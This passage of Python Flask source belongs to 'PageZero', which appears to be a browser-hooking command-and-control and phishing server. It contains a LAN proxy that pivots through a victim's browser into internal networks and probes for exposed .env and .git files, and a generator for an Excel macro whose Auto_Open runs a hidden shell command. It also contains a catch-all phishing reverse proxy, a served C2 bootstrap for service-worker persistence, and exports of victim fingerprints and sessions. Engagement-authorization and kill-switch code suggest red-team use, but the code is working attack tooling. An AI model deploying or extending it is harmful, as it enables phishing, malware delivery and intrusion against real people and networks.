    """Full proxy — every request fetches through the client's browser."""
    if not session.get('admin'):
        return redirect('/login')

    sess = _lan_proxy_sessions.get(session_id)
    if not sess:
        return ('<html><body style="background:#0a0a0a;color:#e5e5e5;font-family:monospace;padding:40px">'
                '<h2>LAN Proxy</h2><p>Session not found or expired.</p>'
                '<a href="/admin" style="color:#3b82f6">Back to PageZero</a></body></html>'), 404

    cid = sess['cid']
    base_url = sess['base_url']
    proxy_base = f'/lanproxy/{session_id}'

    # Build the target URL
    path = '/' + subpath if subpath else '/'
    qs = request.query_string.decode()
    target_url = base_url + path + ('?' + qs if qs else '')

    # Fetch through client
    result = _lan_proxy_fetch(cid, target_url, timeout=20)

    if not isinstance(result, dict) or not result.get('ok'):
        error = result.get('error', 'Unknown error') if isinstance(result, dict) else str(result)
        # Check if we have rich metadata from CORS bypass probes
        meta = result.get('metadata', {}) if isinstance(result, dict) else {}
        strategies = result.get('strategies_tried', 0) if isinstance(result, dict) else 0
        strat_errors = result.get('strategy_errors', []) if isinstance(result, dict) else []

        # Build rich error page with all available intel
        meta_html = ''
        if meta:
            meta_html += '<div style="margin-top:20px;padding:16px;background:#111;border:1px solid #333;border-radius:8px">'
            meta_html += '<h3 style="color:#f97316;margin:0 0 12px">Intel Collected Despite CORS Block</h3>'

            if meta.get('reachable'):
                meta_html += '<div style="color:#22c55e;margin-bottom:8px">&#10003; Host confirmed reachable (no-cors probe successful)</div>'

            if meta.get('inferred_type'):
                meta_html += f'<div style="color:#8b5cf6;font-size:14px;font-weight:600;margin-bottom:8px">Inferred: {_html.escape(meta["inferred_type"])}</div>'

            if meta.get('server'):
                meta_html += f'<div style="color:#a0a0a0;margin-bottom:4px">Server: <span style="color:#e5e5e5">{_html.escape(meta["server"])}</span></div>'
            if meta.get('powered_by'):
                meta_html += f'<div style="color:#a0a0a0;margin-bottom:4px">Powered by: <span style="color:#e5e5e5">{_html.escape(meta["powered_by"])}</span></div>'
            if meta.get('http_methods'):
                meta_html += f'<div style="color:#a0a0a0;margin-bottom:4px">Allowed methods: <span style="color:#e5e5e5">{_html.escape(meta["http_methods"])}</span></div>'

            timing = meta.get('timing', {})
            if timing:
                parts = []
                if timing.get('duration_ms'): parts.append(f'Duration: {timing["duration_ms"]}ms')
                if timing.get('ttfb_ms'): parts.append(f'TTFB: {timing["ttfb_ms"]}ms')
                if timing.get('transfer_bytes'): parts.append(f'Size: ~{timing["transfer_bytes"]}B')
                if parts:
                    meta_html += f'<div style="color:#a0a0a0;margin-bottom:4px">Timing: <span style="color:#e5e5e5">{", ".join(parts)}</span></div>'
            if meta.get('size_hint'):
                meta_html += f'<div style="color:#a0a0a0;margin-bottom:4px">{_html.escape(meta["size_hint"])}</div>'

            # Favicons
            favicons = meta.get('favicons', [])
            if favicons:
                fav_html = ', '.join([f'{_html.escape(f.get("path","?"))} ({f.get("width","?")}x{f.get("height","?")})' for f in favicons])
                meta_html += f'<div style="color:#a0a0a0;margin-bottom:4px">Favicons: <span style="color:#e5e5e5">{fav_html}</span></div>'

            # WebSocket
            ws = meta.get('websocket', {})
            if ws:
                if ws.get('accepts_ws'):
                    meta_html += f'<div style="color:#22c55e;margin-bottom:4px">&#10003; Accepts WebSocket connections ({ws.get("time_ms",0)}ms)</div>'
                elif ws.get('close_code'):
                    meta_html += f'<div style="color:#a0a0a0;margin-bottom:4px">WebSocket: rejected (code {ws["close_code"]})</div>'

            # Detected paths
            paths = meta.get('detected_paths', [])
            if paths:
                meta_html += '<div style="margin-top:8px;color:#a0a0a0">Detected paths:</div>'
                for p in paths[:20]:
                    color = '#ef4444' if '⚠' in p.get('hint','') else '#22c55e'
                    meta_html += f'<div style="padding:2px 0"><span style="color:{color};font-family:monospace">{_html.escape(p.get("path",""))}</span> <span style="color:#666;font-size:11px">{_html.escape(p.get("hint",""))}</span></div>'

            # Security exposures
            exposures = []
            if meta.get('exposure_env'): exposures.append('.env file exposed')
            if meta.get('exposure_git'): exposures.append('.git directory exposed')
            if meta.get('exposure_svn'): exposures.append('.svn directory exposed')
            if exposures:
                meta_html += '<div style="margin-top:8px;padding:8px;background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);border-radius:4px">'
                meta_html += '<div style="color:#ef4444;font-weight:600">&#9888; Security Exposures Found!</div>'
                for exp in exposures:
                    meta_html += f'<div style="color:#ef4444;font-size:12px">{_html.escape(exp)}</div>'
                meta_html += '</div>'

            # Error page fingerprint
            err_page = meta.get('error_page_size')
            if err_page:
                meta_html += f'<div style="color:#a0a0a0;margin-top:4px">404 error page size: {err_page}B (used as baseline to filter false positives)'
                if meta.get('error_hint'):
                    meta_html += f' — {_html.escape(meta["error_hint"])}'
                meta_html += '</div>'

            # Firefox note
            if meta.get('path_probe_note'):
                meta_html += f'<div style="color:#666;font-size:11px;margin-top:4px">{_html.escape(meta["path_probe_note"])}</div>'

            meta_html += '</div>'

        # Strategy debug info
        strat_html = ''
        if strategies > 0:
            strat_html = f'<div style="margin-top:12px;color:#555;font-size:11px">Tried {strategies} bypass strategies'
            if strat_errors:
                strat_html += ': ' + '; '.join([_html.escape(e) for e in strat_errors[:5]])
            strat_html += '</div>'

        return (f'<html><body style="background:#0a0a0a;color:#e5e5e5;font-family:monospace;padding:40px;max-width:800px">'
                f'<h2 style="color:#f97316">LAN Proxy — CORS Blocked</h2>'
                f'<p style="color:#ef4444;font-size:14px">{_html.escape(error)}</p>'
                f'<p style="color:#a0a0a0">Target: <span style="color:#3b82f6">{_html.escape(target_url)}</span></p>'
                f'<p style="color:#666;font-size:12px">The target server does not send Access-Control-Allow-Origin headers. '
                f'JavaScript in the victim\'s browser made the request and got a response, but CORS prevents reading the body. '
                f'Below is everything we could extract using alternative probes.</p>'
                f'{meta_html}{strat_html}'
                f'<div style="margin-top:20px"><a href="/admin" style="color:#3b82f6;text-decoration:none;padding:8px 16px;'
                f'border:1px solid #3b82f6;border-radius:4px">&larr; Back to PageZero</a></div>'
                f'</body></html>'), 502

    body_raw = result.get('body', '')
    encoding = result.get('encoding', 'text')
    ct = result.get('content_type', '')
    status = result.get('status', 200)

    # Decode body
    if encoding == 'base64':
        try:
            body_bytes = _b64.b64decode(body_raw)
        except Exception:
            body_bytes = b''
        resp = make_response(body_bytes, status)
        resp.headers['Content-Type'] = ct or 'application/octet-stream'
        return resp

    # Text content — may need URL rewriting
    body_text = body_raw
    ct_lower = ct.lower()

    if 'html' in ct_lower:
        # Rewrite URLs in HTML
        body_text = _rewrite_html_urls(body_text, proxy_base, base_url)

        # Inject info bar
        info_bar = (
            f'<div id="__pzProxyBar" style="position:fixed;top:0;left:0;right:0;z-index:999999;'
            f'background:#1a1a2e;color:#e5e5e5;padding:6px 16px;font-family:monospace;font-size:12px;'
            f'border-bottom:2px solid #3b82f6;display:flex;align-items:center;gap:12px">'
            f'<span style="color:#3b82f6;font-weight:700">LAN PROXY</span>'
            f'<span style="color:#a0a0a0">via {_html.escape(cid[:8])}…</span>'
            f'<span style="color:#22c55e">{_html.escape(target_url)}</span>'
            f'<a href="/admin" style="margin-left:auto;color:#f97316;text-decoration:none">'
            f'← Back to PageZero</a></div>'
            f'<div style="height:36px"></div>'
        )
        # Inject link-click interceptor so navigation stays in proxy
        nav_script = (
            f'<script>'
            f'document.addEventListener("click",function(e){{'
            f'  var a=e.target.closest("a");if(!a)return;'
            f'  var href=a.getAttribute("href");if(!href)return;'
            f'  if(href.startsWith("{proxy_base}/"))return;'  # already rewritten
            f'  if(href.startsWith("/")){{e.preventDefault();location.href="{proxy_base}"+href;return;}}'
            f'  if(href.startsWith("{_html.escape(base_url)}")){{e.preventDefault();'
            f'    location.href="{proxy_base}"+href.slice({len(base_url)});return;}}'
            f'}});'
            f'</script>'
        )

        if '<body' in body_text.lower():
            body_text = re.sub(r'(<body[^>]*>)', r'\1' + info_bar, body_text, count=1, flags=re.IGNORECASE)
        else:
            body_text = info_bar + body_text

        if '</body' in body_text.lower():
            body_text = body_text.replace('</body>', nav_script + '</body>', 1)
        elif '</html' in body_text.lower():
            body_text = body_text.replace('</html>', nav_script + '</html>', 1)
        else:
            body_text += nav_script

    elif 'css' in ct_lower:
        body_text = _rewrite_css_urls(body_text, proxy_base, base_url)

    resp = make_response(body_text, status)
    resp.headers['Content-Type'] = ct or 'text/html; charset=utf-8'
    # Prevent caching so proxy always fetches fresh
    resp.headers['Cache-Control'] = 'no-store'
    return resp


# ── Engagement management ─────────────────────────────────────────────────────

@app.route('/api/engagement', methods=['GET'])
def api_engagement_get():
    if not session.get('admin'):
        return 'forbidden', 403
    return jsonify(engagement=active_engagement or None)


@app.route('/api/engagement', methods=['POST'])
def api_engagement_set():
    """Create or update the active engagement. All fields are required."""
    if not session.get('admin'):
        return 'forbidden', 403
    body = request.get_json(silent=True) or {}
    required = ['client', 'contract_ref', 'authorized_domains', 'start_ts', 'end_ts']
    missing  = [f for f in required if not body.get(f)]
    if missing:
        return jsonify(ok=False, error=f"Missing required fields: {missing}"), 400

    domains = body['authorized_domains']
    if isinstance(domains, str):
        domains = [d.strip() for d in domains.split(',') if d.strip()]

    eng_id = uuid.uuid4().hex
    operator = session.get('operator', 'unknown')
    global active_engagement
    active_engagement = {
        'id':                 eng_id,
        'client':             body['client'],
        'contract_ref':       body['contract_ref'],
        'authorized_domains': domains,
        'start_ts':           float(body['start_ts']),
        'end_ts':             float(body['end_ts']),
        'operator':           operator,
        'created_ts':         time.time(),
    }
    try:
        con = get_db()
        con.execute("INSERT INTO engagements VALUES (?,?,?,?,?,?,?,?,?)",
            (eng_id, body['client'], body['contract_ref'],
             json.dumps(domains), float(body['start_ts']), float(body['end_ts']),
             operator, time.time(), 1))
        con.execute("UPDATE engagements SET active=0 WHERE id != ?", (eng_id,))
        con.commit(); con.close()
    except Exception:
        pass
    audit(operator, "ENGAGEMENT_CREATED", active_engagement)
    return jsonify(ok=True, engagement=active_engagement)


# ── Payload generation ─────────────────────────────────────────────────────────

@app.route("/api/payload/excel-macro")
def payload_excel_macro():
    """Generate a .xlsm file with a VBA Auto_Open macro.
    Query params:
      msg  - MsgBox message (default: test message)
      cmd  - optional: shell command to run instead of MsgBox
    """
    if not session.get("admin"):
        return "forbidden", 403
    msg = request.args.get("msg", "Test - PageZero Macro Execution Successful")
    cmd = request.args.get("cmd", "")
    # Build VBA source
    if cmd:
        vba_code = (
            'Attribute VB_Name = "Module1"\r\n'
            'Sub Auto_Open()\r\n'
            '    Shell "' + cmd.replace('"', '""') + '", vbHide\r\n'
            'End Sub\r\n'
        )
    else:
        vba_code = (
            'Attribute VB_Name = "Module1"\r\n'
            'Sub Auto_Open()\r\n'
            '    MsgBox "' + msg.replace('"', '""') + '", vbInformation, "PageZero"\r\n'
            'End Sub\r\n'
        )
    # Serve the pre-built .xlsm from static/ (the VBA source is baked in at build time)
    # For dynamic generation, serve from the static file with the test macro
    static_path = os.path.join(os.path.dirname(__file__), "static", "test_macro.xlsm")
    if os.path.exists(static_path):
        from flask import send_file as _send_file
        return _send_file(static_path,
                          mimetype="application/vnd.ms-excel.sheet.macroEnabled.12",
                          as_attachment=True,
                          download_name="document.xlsm")
    return "payload file not found", 404


# ── Server-Sent Events stream ─────────────────────────────────────────────────

@app.route("/api/stream")
def api_stream():
    if not session.get("admin"):
        return "forbidden", 403
    q = queue.Queue(maxsize=200)
    with _sse_lock:
        _sse_queues.append(q)
    def generate():
        try:
            # Send a heartbeat comment every 15 s to keep the connection alive
            while True:
                try:
                    msg = q.get(timeout=15)
                    yield msg
                except queue.Empty:
                    yield ": heartbeat\n\n"
        finally:
            with _sse_lock:
                try:
                    _sse_queues.remove(q)
                except ValueError:
                    pass
    return app.response_class(generate(), mimetype="text/event-stream",
                              headers={"Cache-Control": "no-cache",
                                       "X-Accel-Buffering": "no"})


# ── Client notes ──────────────────────────────────────────────────────────────

@app.route("/api/client/<cid>/note", methods=["POST"])
def api_client_note(cid):
    if not session.get("admin"):
        return "forbidden", 403
    note = (request.get_json(silent=True) or {}).get("note", "")
    client_notes[cid] = str(note)[:120]
    return jsonify(ok=True)


# ── Export routes ─────────────────────────────────────────────────────────────

@app.route("/api/export/session/<cid>")
def api_export_session(cid):
    if not session.get("admin"):
        return "forbidden", 403
    c = clients.get(cid, {})
    payload = {
        "cid": cid,
        "ip":  c.get("ip"),
        "ua":  c.get("ua"),
        "note": client_notes.get(cid, ""),
        "first_seen": c.get("first_seen"),
        "last_seen":  c.get("last_seen"),
        "fingerprint": c.get("data"),
        "history": list(reversed(cmd_results.get(cid, [])[-500:]))
    }
    r = make_response(json.dumps(payload, indent=2, default=str))
    r.headers["Content-Type"]        = "application/json"
    r.headers["Content-Disposition"] = f'attachment; filename="session-{cid[:8]}.json"'
    return r


@app.route("/api/export/audit")
def api_export_audit():
    if not session.get("admin"):
        return "forbidden", 403
    fmt = request.args.get("fmt", "json")
    try:
        con  = get_db()
        rows = con.execute("SELECT ts, operator, event, detail FROM audit_log ORDER BY id ASC").fetchall()
        con.close()
    except Exception as e:
        return jsonify(ok=False, error=str(e)), 500
    if fmt == "csv":
        buf = io.StringIO()
        w = csv.writer(buf)
        w.writerow(["timestamp", "operator", "event", "detail"])
        for r in rows:
            w.writerow([time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(r[0])), r[1], r[2], r[3]])
        resp = make_response(buf.getvalue())
        resp.headers["Content-Type"]        = "text/csv"
        resp.headers["Content-Disposition"] = 'attachment; filename="audit-log.csv"'
        return resp
    # JSON default
    entries = [{"ts": r[0], "operator": r[1], "event": r[2],
                "detail": json.loads(r[3]) if r[3] else None} for r in rows]
    resp = make_response(json.dumps(entries, indent=2, default=str))
    resp.headers["Content-Type"]        = "application/json"
    resp.headers["Content-Disposition"] = 'attachment; filename="audit-log.json"'
    return resp


@app.route("/api/export/all_sessions")
def api_export_all_sessions():
    if not session.get("admin"):
        return "forbidden", 403
    payload = []
    for cid, c in clients.items():
        payload.append({
            "cid": cid,
            "ip":  c.get("ip"),
            "ua":  c.get("ua"),
            "note": client_notes.get(cid, ""),
            "first_seen": c.get("first_seen"),
            "last_seen":  c.get("last_seen"),
            "fingerprint": c.get("data"),
            "history": list(reversed(cmd_results.get(cid, [])[-500:]))
        })
    resp = make_response(json.dumps(payload, indent=2, default=str))
    resp.headers["Content-Type"]        = "application/json"
    resp.headers["Content-Disposition"] = 'attachment; filename="all-sessions.json"'
    return resp


# ── Kill switch ───────────────────────────────────────────────────────────────


@app.route('/api/killswitch', methods=['POST'])
def api_killswitch():
    if not session.get('admin'):
        return 'forbidden', 403
    operator  = session.get('operator', 'unknown')
    now       = time.time()
    online    = [cid for cid, c in clients.items() if now - c.get('last_seen', 0) < TIMEOUT]
    # Push neutralizing JS to every online client
    for cid in online:
        cmd = {"id": uuid.uuid4().hex, "module_id": "killswitch",
               "name": "Kill Switch", "js": _KILLSWITCH_JS, "ts": now}
        cmd_queue.setdefault(cid, []).append(cmd)
    # Flush all queued commands
    for q in cmd_queue.values():
        q.clear()
    phish_config['target'] = None
    phish_sessions.clear()
    phish_captures.clear()
    audit(operator, "KILL_SWITCH", {"clients_notified": len(online)})
    return jsonify(ok=True, clients_notified=len(online),
                   msg="Kill switch activated — all modules stopped, sessions cleared")


# ── Audit log viewer ──────────────────────────────────────────────────────────

@app.route('/api/audit')
def api_audit():
    if not session.get('admin'):
        return 'forbidden', 403
    limit  = min(int(request.args.get('limit', 200)), 1000)
    offset = int(request.args.get('offset', 0))
    try:
        con  = get_db()
        rows = con.execute(
            "SELECT ts, operator, event, detail FROM audit_log ORDER BY id DESC LIMIT ? OFFSET ?",
            (limit, offset)).fetchall()
        total = con.execute("SELECT COUNT(*) FROM audit_log").fetchone()[0]
        con.close()
        entries = [{"ts": r[0], "operator": r[1], "event": r[2],
                    "detail": json.loads(r[3]) if r[3] else None} for r in rows]
    except Exception as e:
        return jsonify(ok=False, error=str(e)), 500
    return jsonify(entries=entries, total=total)


# ── One-shot browser reset page ───────────────────────────────────────────────
@app.route('/pz-reset')
def pz_reset():
    r = make_response("""<!doctype html><html><head>
<meta charset="utf-8"><title>PageZero — Clearing…</title>
<style>body{background:#0a0a0a;color:#e5e5e5;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}</style>
</head><body>
<div>Clearing — redirecting shortly…</div>
<script>
// Clear-Site-Data header handles cache/storage wipe server-side.
// Just unregister SWs (fire-and-forget) and redirect immediately.
if('serviceWorker' in navigator){
  navigator.serviceWorker.getRegistrations().then(function(regs){
    regs.forEach(function(r){r.unregister();});
  });
}
try{localStorage.clear();}catch(e){}
try{sessionStorage.clear();}catch(e){}
location.replace('/admin');
</script></body></html>""")
    r.headers['Clear-Site-Data'] = '"cache", "cookies", "storage"'
    r.headers['Cache-Control']   = 'no-store'
    return r


# ── No-op service worker — prevents target SW from registering on our origin ──

@app.route('/service-worker.js')
@app.route('/sw.js')
@app.route('/firebase-messaging-sw.js')
@app.route('/push-sw.js')
def noop_sw():
    r = make_response(_NOOP_SW)
    r.headers['Content-Type']      = 'application/javascript'
    r.headers['Service-Worker-Allowed'] = '/'
    r.headers['Cache-Control']     = 'no-store'
    return r

@app.route('/pz_sw_bootstrap.js')
def pz_sw_bootstrap_js():
    """Serve the C2 bootstrap script — used by sw_persist service worker injection."""
    cid = request.cookies.get("cid") or "unknown"
    js = _C2_BOOTSTRAP_JS.replace("{{cid}}", cid)
    r = make_response(js)
    r.headers['Content-Type']  = 'application/javascript'
    r.headers['Cache-Control'] = 'no-store'
    return r


# ── Catch-all: proxy any unmatched path to the target ─────────────────────────
# Handles root-relative resources (e.g. /assets/foo.js, /_next/static/...)
# that the target site's JS loads dynamically — Flask specific routes above
# always take priority, so this only fires when nothing else matches.
@app.route('/<path:path>', methods=['GET','POST','PUT','PATCH','DELETE','HEAD','OPTIONS'])
def proxy_catch_all(path):
    if not phish_config.get('target'):
        return 'Not found', 404
    return phish_proxy(path)


def _ensure_ssl_cert():
    """Auto-generate a self-signed cert + key if not present."""
    base = os.path.dirname(os.path.abspath(__file__))
    cert = os.path.join(base, 'pagezero.pem')
    key  = os.path.join(base, 'pagezero.key')
    if os.path.exists(cert) and os.path.exists(key):
        return cert, key
    import subprocess
    subprocess.run([
        'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
        '-keyout', key, '-out', cert,
        '-days', '365', '-nodes',
        '-subj', '/CN=PageZero',
        '-addext', 'subjectAltName=DNS:localhost,IP:127.0.0.1,IP:0.0.0.0'
    ], check=True, capture_output=True)
    print(f"[*] Generated self-signed cert: {cert}")
    return cert, key


if __name__ == "__main__":
    import sys
    init_db()
    use_ssl = '--ssl' in sys.argv
    port    = 8880
    # Parse --port if provided
    for i, arg in enumerate(sys.argv):
        if arg == '--port' and i + 1 < len(sys.argv):
            port = int(sys.argv[i + 1])

    if use_ssl:
        cert, key = _ensure_ssl_cert()
        print(f"[*] PageZero starting on https://0.0.0.0:{port}")
        app.run(host="0.0.0.0", port=port, debug=False, threaded=True, ssl_context=(cert, key))
    else:
        print(f"[*] PageZero starting on http://0.0.0.0:{port}")
        print(f"[*] Use --ssl to enable HTTPS (required for some targets, breaks LAN scanning)")
        app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
